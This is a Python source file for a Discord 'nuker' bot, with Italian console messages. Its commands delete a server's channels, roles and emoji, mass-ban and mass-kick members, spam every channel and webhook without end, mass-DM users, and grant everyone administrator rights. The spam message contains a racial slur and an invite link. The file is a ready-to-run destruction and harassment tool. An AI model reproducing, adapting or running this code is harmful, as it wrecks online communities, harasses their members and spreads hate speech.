import discord
import asyncio
import colorama
import json
import random
import os
from colorama import Fore,Back,Style
from discord.ext import commands
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter


client = commands.Bot(command_prefix="!", intents = discord.Intents.all())
client.remove_command('help')
######################################setup########################################

token = "BOT TOKEN"

channel_names = ['Nuked by TUR']
message_spam = ['NUKED BY https://discord.gg/ZwbJgvMc @everyone @here niggers']
webhook_names = ['NUKED BY TUR']

###################################################################################

@client.event
async def on_ready():
  clear = lambda: os.system("clear")
  await client.change_presence(activity=discord.Game(name= "Gerry Scotti#0001"))#change this if you want 
  clear()
  print(f"{Fore.BLUE}_" * 60)
  print(f''' 

 _____ _                  _ _   _                 _             __       _             
/__   \ |__   ___   /\ /\| | |_(_)_ __ ___   __ _| |_ ___    /\ \ \_   _| | _____ _ __ 
  / /\/ '_ \ / _ \ / / \ \ | __| | '_ ` _ \ / _` | __/ _ \  /  \/ / | | | |/ / _ \ '__|
 / /  | | | |  __/ \ \_/ / | |_| | | | | | | (_| | ||  __/ / /\  /| |_| |   <  __/ |   
 \/   |_| |_|\___|  \___/|_|\__|_|_| |_| |_|\__,_|\__\___| \_\ \/  \__,_|_|\_\___|_|   
                                                                                       

\x1b[38;5;172m [!] Il Bot {client.user} è online
\x1b[38;5;172m [!] I comandi sono in README.md 
\x1b[38;5;172m [!] CREDIT:https://discord.gg/UX9jBAfsGM | Gerry Scotti#0001
\x1b[38;5;172m

 [*] CTRL + C per disattivare 
 
''')    

  print(f"{Fore.BLUE}_" * 60)          
  print(f"{Fore.BLUE}LOG")
@client.command()
async def nuke(ctx, amount=50):
  await ctx.message.delete()
  await ctx.guild.edit(name="Nuked by TUR")#change this if u want
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m [SUCCESS] Il canale{channel.name} è stato eliminato!")
    except:
        pass
        print ("\x1b[38;5;196m [ERROR] Impossibile eliminare questo canale!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34m [SUCCESS] Canali creati con successo [{i}]!")
    except:
      print("\x1b[38;5;196m [SUCCESS] Impossibile creare canali!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34m [SUCCCESS] È stato eliminato con  successo!")

    except:
      print(f"\x1b[38;5;196m [ERROR] {role.name} è impossibile da eliminare!")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m [SUCCESS]{channel.name} è stato pingato")
        except:
          print(f"\x1b[38;5;196m [ERROR] {channel.name} è impossibilile da pingare!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "YOU GOT F BY TUR")#change this if u want
          print(f"\x1b[38;5;34m [SUCCESS]{member.name} è stato bannato da {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196m [ERROR] Impossibile bannare {member.name} in {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def banall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m [SUCCESS]{member.name} È stato bannato in {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196m [ERROR] Impossibile Bannnare {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="NUKED")
      print(f"\x1b[38;5;34m{member.name} è stato kickato in {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mImpossibile kickare {member.name} in {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"NUKED BY TUR")
      print(f"\x1b[38;5;34m [SUCCESS] Creato ruolo in {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196m [ERROR] Impossibile creare ruoli in {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34m [SUCCESS] Cancellata emoji  {emoji.name} in {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196m [ERROR] Impossibile eliminare {emoji.name} in {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34m [SUCCESS] DMed tutti i membri in {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196m [ERROR] Impossibile mandare DM a tutti i membri in {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34m[SUCCESS] Dato a tutti i permessi da amministratore in {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196m [ERROR] Impossibile dare a tutti i permessi di amministratore  {ctx.guild.name}!")


@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    retStr = str("""```fix\n!nuke - Destroys Guild\n\n!banall - Bans All Members \n\n!kickall - Kicks All Members\n\n!rolespam - Spams Roles\n\n!emojidel - Deletes All Emojis\n\n!dm [Input] - Dms Everyone In Guild\n\n!admin - Gives Everyone Admin```""")
    embed = discord.Embed(color=14177041,title="THE ULTIMATE NUKER")
    embed.add_field(name="DISCORD NUKER Help",value=retStr)
    embed.set_footer(text=f"Requested By {ctx.author} | BITCH")

    await ctx.send(embed=embed)


client.run(token)
